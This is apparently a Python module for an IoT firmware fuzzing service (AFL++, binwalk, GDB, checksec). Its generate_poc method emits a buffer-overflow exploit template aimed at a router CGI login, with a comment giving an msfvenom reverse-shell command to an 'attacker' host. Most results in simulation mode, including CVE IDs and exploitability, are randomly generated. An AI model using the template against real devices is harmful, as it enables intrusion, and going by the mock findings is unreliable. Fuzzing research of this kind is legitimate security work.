"""
FuzzingService — Fuzzing automatisé de firmwares IoT et binaires.
AFL++, libFuzzer, binwalk, checksec, GDB.
"""
from __future__ import annotations

import asyncio
import json
import logging
import math
import os
import random
import shutil
import string
import time
import uuid
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

SIMULATION_MODE = os.getenv("SIMULATION_MODE", "true").lower() == "true"
_OUTPUT_DIR = Path("./data/zeroday_output")
_OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
_FIRMWARE_DIR = _OUTPUT_DIR / "firmware"
_FIRMWARE_DIR.mkdir(exist_ok=True)
_CRASH_DIR = _OUTPUT_DIR / "crashes"
_CRASH_DIR.mkdir(exist_ok=True)
_CORPUS_DIR = _OUTPUT_DIR / "corpus"
_CORPUS_DIR.mkdir(exist_ok=True)

# ── Active jobs ───────────────────────────────────────────────────────────────
_ACTIVE_JOBS: dict[str, dict] = {}

# ── Mock vendor data ──────────────────────────────────────────────────────────

_MOCK_VENDORS = {
    "tp-link": {"models": ["TL-WR841N", "TL-WR1043ND", "Archer AX50"], "firmware_base": "https://www.tp-link.com/en/support/download/"},
    "netgear": {"models": ["R7000", "R8000", "Nighthawk AX12"], "firmware_base": "https://www.netgear.com/support/"},
    "d-link": {"models": ["DIR-615", "DIR-882", "DIR-X5460"], "firmware_base": "https://support.dlink.com/"},
    "hikvision": {"models": ["DS-2CD2143G2", "DS-7608NI"], "firmware_base": "https://www.hikvision.com/en/support/"},
    "dahua": {"models": ["IPC-HFW2849S", "NVR4104"], "firmware_base": "https://www.dahuasecurity.com/support/"},
}

_MOCK_BINARIES = [
    {"name": "httpd", "path": "/usr/sbin/httpd", "arch": "MIPS32", "endian": "big", "stripped": True, "size_kb": 892, "canary": False, "nx": False, "pie": False, "relro": "none", "difficulty": 4},
    {"name": "miniupnpd", "path": "/usr/sbin/miniupnpd", "arch": "MIPS32", "endian": "big", "stripped": True, "size_kb": 256, "canary": False, "nx": False, "pie": False, "relro": "none", "difficulty": 3},
    {"name": "boa", "path": "/usr/sbin/boa", "arch": "ARM32", "endian": "little", "stripped": True, "size_kb": 184, "canary": False, "nx": True, "pie": False, "relro": "partial", "difficulty": 5},
    {"name": "telnetd", "path": "/usr/sbin/telnetd", "arch": "MIPS32", "endian": "big", "stripped": False, "size_kb": 96, "canary": False, "nx": False, "pie": False, "relro": "none", "difficulty": 2},
    {"name": "libssl.so.1.0.0", "path": "/usr/lib/libssl.so.1.0.0", "arch": "ARM32", "endian": "little", "stripped": True, "size_kb": 512, "canary": True, "nx": True, "pie": True, "relro": "full", "difficulty": 8},
]

_CRASH_TYPES = [
    {"type": "STACK_OVERFLOW", "severity": "HIGH", "exploit_class": "BOF_STACK", "exploitable": True, "cvss_base": 8.8},
    {"type": "HEAP_OVERFLOW", "severity": "HIGH", "exploit_class": "BOF_HEAP", "exploitable": True, "cvss_base": 9.1},
    {"type": "FORMAT_STRING", "severity": "CRITICAL", "exploit_class": "FMT_STR", "exploitable": True, "cvss_base": 9.8},
    {"type": "USE_AFTER_FREE", "severity": "HIGH", "exploit_class": "UAF", "exploitable": True, "cvss_base": 8.4},
    {"type": "NULL_DEREF", "severity": "MEDIUM", "exploit_class": "DOS", "exploitable": False, "cvss_base": 5.3},
    {"type": "INTEGER_OVERFLOW", "severity": "HIGH", "exploit_class": "INT_OVERFLOW", "exploitable": True, "cvss_base": 7.8},
    {"type": "COMMAND_INJECTION", "severity": "CRITICAL", "exploit_class": "CMD_INJ", "exploitable": True, "cvss_base": 10.0},
]


async def _run(cmd: list[str], timeout: int = 30) -> tuple[str, str, int]:
    try:
        proc = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill(); await proc.communicate()
            return "", "Timeout", -1
        return stdout.decode("utf-8", errors="replace"), stderr.decode("utf-8", errors="replace"), proc.returncode
    except Exception as e:
        return "", str(e), -1


class FuzzingService:

    def __init__(self):
        self.simulation_mode = SIMULATION_MODE
        self.tools = {
            "binwalk": bool(shutil.which("binwalk")),
            "afl_fuzz": bool(shutil.which("afl-fuzz")),
            "afl_tmin": bool(shutil.which("afl-tmin")),
            "gdb": bool(shutil.which("gdb")),
            "checksec": bool(shutil.which("checksec")),
            "file": bool(shutil.which("file")),
        }
        self._targets: dict[str, dict] = {}

    async def download_firmware(self, vendor: str, model: str, url: str = None) -> dict:
        await asyncio.sleep(3)
        vendor_info = _MOCK_VENDORS.get(vendor.lower(), {"models": [model], "firmware_base": "https://example.com/"})
        fw_name = f"{vendor}_{model}_v1.0.0_firmware.bin".replace(" ", "_")
        fw_path = str(_FIRMWARE_DIR / fw_name)

        if self.simulation_mode or not url:
            fw_data = b"SIMULATED_FIRMWARE_" + b"\x00" * 1024 * 512
            Path(fw_path).write_bytes(fw_data)
            target_id = str(uuid.uuid4())
            self._targets[target_id] = {
                "id": target_id, "vendor": vendor, "model": model,
                "firmware_version": "1.0.0", "firmware_path": fw_path,
                "firmware_size_mb": round(len(fw_data) / 1e6, 2),
                "binaries_count": 0,
                "crashes_found": 0, "exploitable_crashes": 0,
                "created_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
            }
            return {"target_id": target_id, "firmware_path": fw_path, "size_mb": self._targets[target_id]["firmware_size_mb"], "simulation": True}

        stdout, _, rc = await _run(["wget", "-q", url or vendor_info["firmware_base"], "-O", fw_path], timeout=120)
        return {"firmware_path": fw_path if rc == 0 else "", "success": rc == 0}

    async def extract_firmware(self, firmware_path: str) -> dict:
        await asyncio.sleep(4)
        out_dir = str(_FIRMWARE_DIR / f"extracted_{Path(firmware_path).stem}_{int(time.time())}")
        Path(out_dir).mkdir(exist_ok=True)

        if self.simulation_mode or not self.tools["binwalk"]:
            (Path(out_dir) / "squashfs-root").mkdir(exist_ok=True)
            fake_tree = {
                "usr": {"sbin": ["httpd", "miniupnpd", "boa", "telnetd"], "lib": ["libssl.so.1.0.0", "libc.so.0"]},
                "etc": ["passwd", "shadow", "init.d"],
                "tmp": [],
                "var": [],
            }
            for top, subs in fake_tree.items():
                d = Path(out_dir) / "squashfs-root" / top
                d.mkdir(parents=True, exist_ok=True)
                if isinstance(subs, dict):
                    for sub, files in subs.items():
                        (d / sub).mkdir(exist_ok=True)
                        for f in files:
                            (d / sub / f).write_bytes(b"\x7fELF\x01\x02\x01\x00" + b"\x00" * 56)
                else:
                    for f in subs:
                        (d / f).write_text(f"# {f} config")
            return {"extracted_path": out_dir, "filesystem_type": "SquashFS", "total_files": 28, "simulation": True}

        stdout, _, rc = await _run(["binwalk", "-e", firmware_path, "-C", out_dir, "--run-as=root"], timeout=300)
        return {"extracted_path": out_dir, "raw_output": stdout[:2000], "success": rc == 0}

    async def identify_binaries(self, extracted_path: str) -> list[dict]:
        await asyncio.sleep(2)
        if self.simulation_mode:
            return _MOCK_BINARIES

        results = []
        base = Path(extracted_path)
        for f in base.rglob("*"):
            if f.is_file() and not f.suffix:
                stdout, _, _ = await _run(["file", str(f)], timeout=5)
                if "ELF" in stdout:
                    arch = "MIPS32" if "MIPS" in stdout else "ARM32" if "ARM" in stdout else "x86_64" if "x86-64" in stdout else "unknown"
                    results.append({
                        "name": f.name,
                        "path": str(f),
                        "arch": arch,
                        "endian": "big" if "MSB" in stdout else "little",
                        "stripped": "not stripped" not in stdout,
                        "size_kb": f.stat().st_size // 1024,
                        "canary": False,
                        "nx": False,
                        "pie": False,
                        "relro": "none",
                        "difficulty": random.randint(3, 8),
                    })
        return results

    async def fuzz_binary(self, binary_path: str, timeout: int = 3600, corpus_path: str = None) -> dict:
        task_id = "fuzz_" + "".join(random.choices(string.hexdigits.lower(), k=10))

        if self.simulation_mode or not self.tools["afl_fuzz"]:
            job = {
                "task_id": task_id,
                "binary_path": binary_path,
                "binary_name": Path(binary_path).name,
                "started_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
                "timeout_s": timeout,
                "status": "running",
                "crash_count": 0,
                "unique_crashes": 0,
                "execution_paths": 0,
                "coverage_percent": 0,
                "exec_speed": 0,
                "simulation": True,
            }
            _ACTIVE_JOBS[task_id] = job
            asyncio.create_task(self._simulate_fuzzing(task_id, timeout))
            return job

        corpus = corpus_path or str(_CORPUS_DIR)
        out_dir = str(_OUTPUT_DIR / f"afl_{task_id}")
        proc = await asyncio.create_subprocess_exec(
            "afl-fuzz", "-i", corpus, "-o", out_dir, "-t", "1000", "--", binary_path, "@@",
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        job = {"task_id": task_id, "binary_path": binary_path, "afl_pid": proc.pid, "out_dir": out_dir, "status": "running", "simulation": False}
        _ACTIVE_JOBS[task_id] = job
        return job

    async def _simulate_fuzzing(self, task_id: str, timeout: int):
        job = _ACTIVE_JOBS.get(task_id)
        if not job:
            return
        start = time.time()
        while time.time() - start < min(timeout, 300) and task_id in _ACTIVE_JOBS and _ACTIVE_JOBS[task_id]["status"] == "running":
            elapsed = time.time() - start
            pct = elapsed / min(timeout, 300)
            job["coverage_percent"] = round(min(78, pct * 80 + random.uniform(-2, 2)), 1)
            job["execution_paths"] = int(pct * 12000 + random.randint(0, 500))
            job["exec_speed"] = random.randint(800, 3000)
            job["elapsed_s"] = int(elapsed)
            if random.random() < 0.05 and pct > 0.1:
                crash = self._generate_mock_crash(task_id)
                job["crash_count"] += 1
                if random.random() > 0.3:
                    job["unique_crashes"] += 1
                job.setdefault("crashes", []).append(crash)
            await asyncio.sleep(2)
        job["status"] = "completed"

    def _generate_mock_crash(self, task_id: str) -> dict:
        crash_type = random.choice(_CRASH_TYPES)
        crash_file = str(_CRASH_DIR / f"{task_id}_{int(time.time())}.crash")
        Path(crash_file).write_bytes(random.randbytes(random.randint(16, 512)))
        return {
            "file": crash_file,
            "signal": random.choice(["SIGSEGV", "SIGABRT", "SIGFPE", "SIGBUS"]),
            "address": hex(random.randint(0x400000, 0xFFFFFF)),
            "crash_type": crash_type["type"],
            "severity": crash_type["severity"],
            "exploitable": crash_type["exploitable"],
            "cvss_base": crash_type["cvss_base"],
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
        }

    async def get_fuzzing_status(self, task_id: str) -> dict:
        job = _ACTIVE_JOBS.get(task_id)
        if not job:
            return {"error": f"Task {task_id} introuvable"}
        if not self.simulation_mode and job.get("out_dir"):
            stats_file = Path(job["out_dir"]) / "default" / "fuzzer_stats"
            if stats_file.exists():
                stats = {}
                for line in stats_file.read_text().splitlines():
                    if ":" in line:
                        k, v = line.split(":", 1)
                        stats[k.strip()] = v.strip()
                job.update({"exec_speed": int(stats.get("execs_per_sec", 0)), "coverage_percent": float(stats.get("bitmap_cvg", "0%").rstrip("%")), "unique_crashes": int(stats.get("saved_crashes", 0))})
        return job

    async def stop_fuzzing_job(self, task_id: str) -> dict:
        job = _ACTIVE_JOBS.get(task_id)
        if not job:
            return {"error": "Job introuvable"}
        job["status"] = "stopped"
        if job.get("afl_pid"):
            await _run(["kill", str(job["afl_pid"])])
        return {"stopped": True, "task_id": task_id, "crashes_found": job.get("crash_count", 0)}

    async def triage_crash(self, crash_file: str, binary_path: str) -> dict:
        if self.simulation_mode or not self.tools["gdb"]:
            await asyncio.sleep(2)
            ct = random.choice(_CRASH_TYPES)
            funcs = ["strcpy", "sprintf", "memcpy", "gets", "scanf", "vsprintf", "system"]
            return {
                "crash_file": crash_file,
                "crash_type": ct["type"],
                "function": random.choice(funcs),
                "offset": hex(random.randint(0x100, 0x5000)),
                "exploit_class": ct["exploit_class"],
                "severity": ct["severity"],
                "aslr_bypass_needed": random.random() > 0.5,
                "dep_bypass_needed": random.random() > 0.6,
                "backtrace": [
                    f"#0  {random.choice(funcs)}+{hex(random.randint(0, 0x100))} in {Path(binary_path).name}",
                    f"#1  handle_request+{hex(random.randint(0, 0x500))} in {Path(binary_path).name}",
                    f"#2  main_loop+{hex(random.randint(0, 0x200))} in {Path(binary_path).name}",
                ],
                "simulation": True,
            }

        gdb_script = f"run < {crash_file}\nbt\ninfo registers\nquit"
        script_path = f"/tmp/gdb_script_{int(time.time())}.gdb"
        Path(script_path).write_text(gdb_script)
        stdout, _, _ = await _run(["gdb", "-batch", "-x", script_path, binary_path], timeout=30)
        return {"raw_gdb_output": stdout[:3000], "simulation": False}

    async def check_exploitability(self, crash_file: str, binary_path: str, arch: str = "MIPS32") -> dict:
        if self.simulation_mode:
            await asyncio.sleep(2)
            ct = random.choice(_CRASH_TYPES)
            return {
                "crash_file": crash_file,
                "exploitable": ct["exploitable"],
                "class": ct["exploit_class"],
                "severity": ct["severity"],
                "cvss_base": ct["cvss_base"],
                "aslr_bypass_needed": random.random() > 0.5,
                "dep_bypass_needed": random.random() > 0.6,
                "control_of_pc": random.random() > 0.4,
                "control_of_sp": random.random() > 0.5,
                "rop_gadgets_available": random.randint(50, 2000),
                "exploit_difficulty": random.randint(3, 9),
                "exploit_notes": f"Architecture {arch} — libc disponible pour ROP chain",
                "simulation": True,
            }
        return {"error": "GDB + checksec requis", "simulation": False}

    async def check_defenses(self, binary_path: str) -> dict:
        if self.simulation_mode or not self.tools["checksec"]:
            await asyncio.sleep(1)
            binary = next((b for b in _MOCK_BINARIES if b["name"] == Path(binary_path).name), random.choice(_MOCK_BINARIES))
            return {
                "binary": binary_path,
                "aslr": random.random() > 0.7,
                "nx_dep": binary.get("nx", False),
                "stack_canary": binary.get("canary", False),
                "pie": binary.get("pie", False),
                "relro": binary.get("relro", "none"),
                "fortify_source": random.random() > 0.8,
                "difficulty_score": binary.get("difficulty", 5),
                "arch": binary.get("arch", "MIPS32"),
                "simulation": True,
            }
        stdout, _, _ = await _run(["checksec", "--file", binary_path, "--format", "json"])
        try:
            return json.loads(stdout)
        except Exception:
            return {"raw": stdout[:1000]}

    async def generate_poc(self, crash_file: str, binary_path: str) -> str:
        await asyncio.sleep(2)
        poc_path = str(_OUTPUT_DIR / f"poc_{Path(binary_path).name}_{int(time.time())}.py")
        triage = await self.triage_crash(crash_file, binary_path)
        poc_code = f"""#!/usr/bin/env python3
"""
        poc_code += '"""'
        poc_code += f"""
PoC — {Path(binary_path).name}
Crash type: {triage.get('crash_type', 'UNKNOWN')}
Severity: {triage.get('severity', 'UNKNOWN')}
Function: {triage.get('function', 'unknown')}
Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}
"""
        poc_code += '"""'
        poc_code += f"""
import socket, struct, sys

TARGET_IP = "192.168.0.1"
TARGET_PORT = 80

def exploit():
    offset = {random.randint(256, 1024)}

    # Padding
    payload = b"A" * offset

    # Return address (adjust for target system)
    ret_addr = struct.pack("<I", 0x{random.randint(0x400000, 0x800000):08x})

    # Shellcode placeholder (msfvenom -p linux/mipsbe/shell_reverse_tcp LHOST=attacker LPORT=4444)
    shellcode = b"\\x90" * 64  # NOP sled placeholder

    payload += ret_addr + shellcode

    print(f"[*] Sending payload ({len(payload)} bytes) to {{TARGET_IP}}:{{TARGET_PORT}}")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))

    # HTTP wrapper for {Path(binary_path).name}
    http_req = b"POST /cgi-bin/login.cgi HTTP/1.0\\r\\n"
    http_req += b"Content-Length: " + str(len(payload)).encode() + b"\\r\\n\\r\\n"
    http_req += payload

    s.send(http_req)
    print("[*] Payload sent")
    s.close()

if __name__ == "__main__":
    exploit()
"""
        Path(poc_path).write_text(poc_code)
        return poc_path

    async def search_cve_database(self, vendor: str, model: str, binary_name: str, version: str) -> list[dict]:
        await asyncio.sleep(1)
        if self.simulation_mode:
            return [
                {"cve_id": f"CVE-{random.randint(2020,2026)}-{random.randint(10000,99999)}", "severity": "HIGH", "cvss": round(random.uniform(7.0, 9.9), 1), "description": f"{vendor} {model} httpd buffer overflow in CGI handler", "patched": False},
                {"cve_id": f"CVE-{random.randint(2020,2026)}-{random.randint(10000,99999)}", "severity": "CRITICAL", "cvss": 9.8, "description": f"{vendor} {model} command injection via UPnP", "patched": True},
            ]
        return []

    async def schedule_fuzzing_job(self, binary_path: str, duration_hours: int = 24) -> str:
        result = await self.fuzz_binary(binary_path, timeout=duration_hours * 3600)
        return result.get("task_id", "")

    async def generate_report(self, campaign_id: str) -> str:
        job = _ACTIVE_JOBS.get(campaign_id) or {}
        crashes = job.get("crashes", [])
        report_path = str(_OUTPUT_DIR / f"report_{campaign_id}_{int(time.time())}.md")
        report = f"""# Rapport de Fuzzing — {campaign_id}

**Date:** {time.strftime('%Y-%m-%d %H:%M:%S')}
**Binaire:** {job.get('binary_name', 'inconnu')}
**Statut:** {job.get('status', 'inconnu')}
**Coverage:** {job.get('coverage_percent', 0)}%
**Chemins explorés:** {job.get('execution_paths', 0)}

## Résumé

| Crashs trouvés | Crashs uniques | Crashs exploitables |
|---|---|---|
| {job.get('crash_count', 0)} | {job.get('unique_crashes', 0)} | {sum(1 for c in crashes if c.get('exploitable'))} |

## Détail des crashs

"""
        for i, crash in enumerate(crashes, 1):
            report += f"""### Crash #{i} — {crash.get('crash_type', 'UNKNOWN')}

- **Sévérité:** {crash.get('severity', 'N/A')}
- **Signal:** {crash.get('signal', 'N/A')}
- **Adresse:** {crash.get('address', 'N/A')}
- **Exploitable:** {'✅ OUI' if crash.get('exploitable') else '❌ NON'}
- **CVSS Base:** {crash.get('cvss_base', 'N/A')}

"""
        report += "\n## Recommandations\n\n- Mettre à jour le firmware vers la dernière version\n- Implémenter ASLR et NX sur tous les binaires\n- Ajouter des stack canaries\n"
        Path(report_path).write_text(report)
        return report_path

    async def get_targets(self) -> list[dict]:
        return list(self._targets.values())


fuzzing_service = FuzzingService()
